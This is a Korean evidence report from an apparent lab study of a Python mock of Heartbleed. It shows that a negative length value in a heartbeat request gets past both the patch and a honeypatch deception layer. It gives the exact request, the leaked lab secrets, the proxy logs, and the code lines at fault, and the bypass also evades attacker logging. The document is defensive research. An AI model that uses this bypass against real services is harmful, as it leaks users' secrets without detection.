# a. 음수 length: 패치·허니패치 우회로 진짜 비밀 노출

- 기준 커밋: `e77e5cf` (로컬 main. README만 다르고 코드는 `origin/main` `7e41b5c`와 같음, 소스 수정 없이 실행) · 실행 환경: Ubuntu (WSL2), Python 3.12.3
- 수집 스크립트: [`collect.py`](collect.py) · 원자료: [`raw.json`](raw.json) (`"a"` 키)

## 입력
`{"payload":"hello","length":-1}` → `POST /heartbeat` (프록시 경유, 세션 `attacker-a`), 세 모드 각각

## 실행 명령
```bash
python3 evidence/before/collect.py    # 사례마다 타깃(해당 모드)+프록시를 새로 띄우고 일반 종료로 정리
```

## 출력
| 모드 | 단계 | 경로 | status | 응답 길이 | 진짜 비밀 | 응답 헤더(X-) | 응답 본문(앞 60자) |
|---|---|---|---|---|---|---|---|
| unpatched | a: hello / length -1 | proxy:8080 | 200 | 107 | 6 | - | `hello9f2c4e81a7b3d065\|alice\|10.0.0.23;51d8e0c29b7fa364\|bob\|1` |
| patched | a: hello / length -1 | proxy:8080 | 200 | 107 | 6 | - | `hello9f2c4e81a7b3d065\|alice\|10.0.0.23;51d8e0c29b7fa364\|bob\|1` |
| honeypatched | a: hello / length -1 | proxy:8080 | 200 | 107 | 6 | - | `hello9f2c4e81a7b3d065\|alice\|10.0.0.23;51d8e0c29b7fa364\|bob\|1` |

## 관찰
1. **세 모드 모두 200 · 107바이트 · 진짜 비밀 6건 노출** (alice·bob의 token·user·ip 전부). 패치 모드와 허니패치 모드도 미패치와 응답이 같다.
2. 원인(코드): 패치 조건이 `length > len(payload)`(server/app.py 36행)뿐이라 음수는 통과한다. 이어서 `memory[:length]`(46행)는 파이썬 슬라이스라 `[:-1]`이 '마지막 1바이트를 뺀 힙 전체'를 돌려준다. C의 Heartbleed에는 없는, 파이썬 축소 구현에서 생긴 반례다.
3. 허니패치에서도 fork가 일어나지 않는다(`fork_ok` 없음, `route to=target`). 탐지 조건에 걸리지 않으니 미끼로 옮겨지지 않고 타깃의 진짜 메모리가 나간다.
4. `attacker.jsonl`에 기록이 **없다**. 기록 조건이 `over > 0`인데 `over = -1 - 5 = -6`이라 정상 요청으로 분류된다. 방어자 쪽에는 `route ... status 200` 한 줄만 남아, 비밀이 샌 사실을 로그로 알 수 없다.
5. 고정 검증 사례 3종에는 음수 입력이 없어 `run_demo.py`는 15/15로 통과한다.

## 로그 발췌 (단계별 증가분, 시각 `t` 제외)

**[unpatched] a: hello / length -1**

- 요청: `POST /heartbeat` · `X-Session-Id: attacker-a` · proxy:8080 · 본문 `{"payload": "hello", "length": -1}`
- 노출된 진짜 비밀: `9f2c4e81a7b3d065`, `alice`, `10.0.0.23`, `51d8e0c29b7fa364`, `bob`, `172.16.4.150`
- 응답 본문 전체: `'hello9f2c4e81a7b3d065|alice|10.0.0.23;51d8e0c29b7fa364|bob|172.16.4.150;0000000000000000|attacker|127.0.0.1'`
- defender.jsonl:
  ```json
  {"event": "route", "session": "attacker-a", "to": "target", "status": 200}
  ```
- attacker.jsonl:
  - (기록 없음)

**[patched] a: hello / length -1**

- 요청: `POST /heartbeat` · `X-Session-Id: attacker-a` · proxy:8080 · 본문 `{"payload": "hello", "length": -1}`
- 노출된 진짜 비밀: `9f2c4e81a7b3d065`, `alice`, `10.0.0.23`, `51d8e0c29b7fa364`, `bob`, `172.16.4.150`
- 응답 본문 전체: `'hello9f2c4e81a7b3d065|alice|10.0.0.23;51d8e0c29b7fa364|bob|172.16.4.150;0000000000000000|attacker|127.0.0.1'`
- defender.jsonl:
  ```json
  {"event": "route", "session": "attacker-a", "to": "target", "status": 200}
  ```
- attacker.jsonl:
  - (기록 없음)

**[honeypatched] a: hello / length -1**

- 요청: `POST /heartbeat` · `X-Session-Id: attacker-a` · proxy:8080 · 본문 `{"payload": "hello", "length": -1}`
- 노출된 진짜 비밀: `9f2c4e81a7b3d065`, `alice`, `10.0.0.23`, `51d8e0c29b7fa364`, `bob`, `172.16.4.150`
- 응답 본문 전체: `'hello9f2c4e81a7b3d065|alice|10.0.0.23;51d8e0c29b7fa364|bob|172.16.4.150;0000000000000000|attacker|127.0.0.1'`
- defender.jsonl:
  ```json
  {"event": "route", "session": "attacker-a", "to": "target", "status": 200}
  ```
- attacker.jsonl:
  - (기록 없음)
